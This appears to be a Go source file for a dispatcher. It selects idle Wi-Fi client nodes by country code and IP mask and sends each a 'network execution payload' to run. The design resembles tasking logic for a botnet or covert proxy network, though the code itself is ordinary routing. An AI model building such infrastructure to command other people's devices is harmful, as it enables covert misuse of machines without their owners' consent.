package coordinator

import (
	"fmt"
	"net"
)

// IPMask matches client IPs against a CIDR or exact address.
type IPMask struct {
	network *net.IPNet
	exact   net.IP
}

// ParseIPMask parses "a.b.c.d/nn" CIDR or a bare IP into an IPMask.
func ParseIPMask(spec string) (*IPMask, error) {
	if spec == "" {
		return nil, nil
	}
	if _, network, err := net.ParseCIDR(spec); err == nil {
		return &IPMask{network: network}, nil
	}
	ip := net.ParseIP(spec)
	if ip == nil {
		return nil, fmt.Errorf("invalid IP mask %q", spec)
	}
	return &IPMask{exact: ip}, nil
}

// Contains reports whether ipText falls inside this mask.
func (m *IPMask) Contains(ipText string) bool {
	if m == nil {
		return true
	}
	ip := net.ParseIP(ipText)
	if ip == nil {
		return false
	}
	if m.network != nil {
		return m.network.Contains(ip)
	}
	if m.exact != nil {
		return m.exact.Equal(ip)
	}
	return true
}

// DispatchRequest is an enterprise routing request for a target geography.
type DispatchRequest struct {
	Country string // required ISO country code (e.g. "US")
	IPMask  string // optional CIDR or exact IP
	Payload []byte // network execution payload
}

// DispatchResult summarises a non-blocking dispatch attempt.
type DispatchResult struct {
	Matched   int
	Delivered int
	Dropped   int
	Err       error
}

// Dispatcher routes payloads to idle Wi-Fi nodes without blocking event loops.
type Dispatcher struct {
	hub *Hub
}

// NewDispatcher binds a dispatcher to a connection hub.
func NewDispatcher(hub *Hub) *Dispatcher {
	return &Dispatcher{hub: hub}
}

// Route selects idle Wi-Fi nodes matching country + IP mask and pipes the
// payload down each node's Send channel using non-blocking TrySend so the
// main event loops are never stalled by a slow or full buffer.
func (d *Dispatcher) Route(req DispatchRequest) DispatchResult {
	if d == nil || d.hub == nil {
		return DispatchResult{Err: fmt.Errorf("dispatcher not initialised")}
	}
	if req.Country == "" {
		return DispatchResult{Err: fmt.Errorf("country code required")}
	}
	if len(req.Payload) == 0 {
		return DispatchResult{Err: fmt.Errorf("empty payload")}
	}

	mask, err := ParseIPMask(req.IPMask)
	if err != nil {
		return DispatchResult{Err: err}
	}

	// Instant memory-cache query of matching idle Wi-Fi connections.
	matches := d.hub.MatchIdleWiFi(req.Country, mask)
	res := DispatchResult{Matched: len(matches)}

	for _, c := range matches {
		if c.TrySend(req.Payload) {
			res.Delivered++
		} else {
			res.Dropped++
		}
	}
	return res
}

// RouteOne delivers to the first matching idle Wi-Fi node only.
// Prefer this when a single executor is enough.
func (d *Dispatcher) RouteOne(req DispatchRequest) DispatchResult {
	if d == nil || d.hub == nil {
		return DispatchResult{Err: fmt.Errorf("dispatcher not initialised")}
	}
	if req.Country == "" {
		return DispatchResult{Err: fmt.Errorf("country code required")}
	}
	if len(req.Payload) == 0 {
		return DispatchResult{Err: fmt.Errorf("empty payload")}
	}

	mask, err := ParseIPMask(req.IPMask)
	if err != nil {
		return DispatchResult{Err: err}
	}

	matches := d.hub.MatchIdleWiFi(req.Country, mask)
	res := DispatchResult{Matched: len(matches)}
	if len(matches) == 0 {
		return res
	}
	if matches[0].TrySend(req.Payload) {
		res.Delivered = 1
	} else {
		res.Dropped = 1
	}
	return res
}
